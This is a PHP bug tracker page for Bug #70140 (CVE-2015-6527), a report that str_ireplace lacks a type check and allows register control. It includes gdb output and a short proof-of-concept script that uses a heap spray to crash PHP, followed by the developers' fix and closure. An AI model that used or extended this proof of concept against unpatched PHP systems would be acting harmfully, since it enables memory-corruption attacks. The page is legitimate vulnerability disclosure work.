<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='Strings related Bug #70140 - RDF' href='rss/bug.php?id=70140'>
        <link rel='alternate' type='application/rss+xml' title='Strings related Bug #70140 - RSS 2.0' href='rss/bug.php?id=70140&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Bug #70140 :: str_ireplace/php_string_tolower - Arbitrary Code Execution</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=70140">Bug</a>&nbsp;#70140</th>
            <td id="summary" colspan="5">str_ireplace/php_string_tolower - Arbitrary Code Execution</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2015-07-26 14:15 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2015-08-23 12:27 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>fourny &#x64;&#111;&#x74; d &#x61;&#116; gmail &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=laruence">laruence</a> (<a href="https://people.php.net/laruence">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=Strings+related">Strings related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>7.0Git-2015-07-26 (Git)</td>
            <th class="details">OS:</th>
            <td>x86_64 GNU/Linux</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6527" target="_blank">2015-6527</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=70140&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=70140&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=70140&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1437920143">&nbsp;</a><strong>[2015-07-26 14:15 UTC] fourny &#x64;&#111;&#x74; d &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
Hello,

I discovered a vulnerability issue in this PHP version:

$ php --version
PHP 7.0.0-dev (cli) (built: Jul 25 2015 11:31:46) (DEBUG)
Copyright (c) 1997-2015 The PHP Group
Zend Engine v3.0.0-dev, Copyright (c) 1998-2015 Zend Technologies

In this new version of PHP, it is possible to control some registers and this could be lead to an arbitrary code execution.
The problem is in the function &quot;str_ireplace&quot;, the third arguments &quot;$subject&quot; type is not checked.
Because of that, we can control the assembly registers.

We can check that in gdb:

Breakpoint 1, 0x00000000008139ff in php_string_tolower (s=0x7fff55e00020) at /home/df0/php-src/ext/standard/string.c:1503
1503            e = c + ZSTR_LEN(s);
(gdb) x/10i $rip
=&gt; 0x8139ff &lt;php_string_tolower+29&gt;:    mov    rdx,QWORD PTR [rax+0x10]
   0x813a03 &lt;php_string_tolower+33&gt;:    mov    rax,QWORD PTR [rbp-0x18]
   0x813a07 &lt;php_string_tolower+37&gt;:    add    rax,rdx
   0x813a0a &lt;php_string_tolower+40&gt;:    mov    QWORD PTR [rbp-0x20],rax
   0x813a0e &lt;php_string_tolower+44&gt;:    jmp    0x813af2 &lt;php_string_tolower+272&gt;
   0x813a13 &lt;php_string_tolower+49&gt;:    call   0x42b2c0 &lt;__ctype_b_loc@plt&gt;
   0x813a18 &lt;php_string_tolower+54&gt;:    mov    rdx,QWORD PTR [rax]
   0x813a1b &lt;php_string_tolower+57&gt;:    mov    rax,QWORD PTR [rbp-0x18]
   0x813a1f &lt;php_string_tolower+61&gt;:    movzx  eax,BYTE PTR [rax]
   0x813a22 &lt;php_string_tolower+64&gt;:    movzx  eax,al
(gdb) x/10x $rax
0x7fff55e00020: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fff55e00030: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fff55e00040: 0x41414141      0x41414141
(gdb) ni
0x0000000000813a03      1503            e = c + ZSTR_LEN(s);
(gdb) x/x $rdx
0x4141414141414141:     Cannot access memory at address 0x4141414141414141

If you have a question, do not hesitate.

Regards, Dimitri Fourny.

Test script:
---------------
&lt;?php

// heap spray
ini_set(&quot;memory_limit&quot;, -1);
$part = str_repeat(&quot;\x41&quot;, 4096);
$str = str_repeat($part, 10*1024*1024*256/4096);

// the core
$a =  &quot;string&quot;;
str_ireplace($a, $a, 0x7fff55e00020);

?&gt;

Actual result:
--------------
Program received signal SIGSEGV, Segmentation fault.
0x00000000008139ff in php_string_tolower (s=0x7fff55e00020) at php-src/ext/standard/string.c:1503

</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=70140'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=70140'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1438004673">&nbsp;</a><strong>[2015-07-27 13:44 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status:      Open</span>
<span class="added">+Status:      Closed</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: laruence</span>
</div></div></div><div class='comment type_comment' ><a name="1438004673">&nbsp;</a><strong>[2015-07-27 13:44 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<pre class='note'>fixed in <a href="https://github.com/php/php-src/commit/6aeee47b2cd47915ccfa3b41433a3f57aea24dd5" rel="nofollow">https://github.com/php/php-src/commit/6aeee47b2cd47915ccfa3b41433a3f57aea24dd5</a>
</pre>
</div><div class='comment type_comment' ><a name="1438166240">&nbsp;</a><strong>[2015-07-29 10:37 UTC] fourny &#x64;&#111;&#x74; d &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Thank you. Can you make this bug public please?

Regards, Dimitri Fourny.
</pre>
</div><div class='comment type_log' ><a name="1438193898">&nbsp;</a><strong>[2015-07-29 18:18 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type: Security</span>
<span class="added">+Type: Bug</span>
</div></div></div><div class='comment type_svn' ><a name="1438721690">&nbsp;</a><strong>[2015-08-04 20:54 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of laruence
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=6aeee47b2cd47915ccfa3b41433a3f57aea24dd5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=6aeee47b2cd47915ccfa3b41433a3f57aea24dd5</a>
Log: Fixed <a href='bug.php?id=70140'>bug #70140</a> (str_ireplace/php_string_tolower - Arbitrary Code Execution)
</pre>
</div><div class='comment type_log' ><a name="1440332826">&nbsp;</a><strong>[2015-08-23 12:27 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2015-6527</span>
</div></div></div><div class='comment type_svn' ><a name="1469014643">&nbsp;</a><strong>[2016-07-20 11:37 UTC] <a href="//people.php.net/davey">davey@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of laruence
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=6aeee47b2cd47915ccfa3b41433a3f57aea24dd5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=6aeee47b2cd47915ccfa3b41433a3f57aea24dd5</a>
Log: Fixed <a href='bug.php?id=70140'>bug #70140</a> (str_ireplace/php_string_tolower - Arbitrary Code Execution)
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
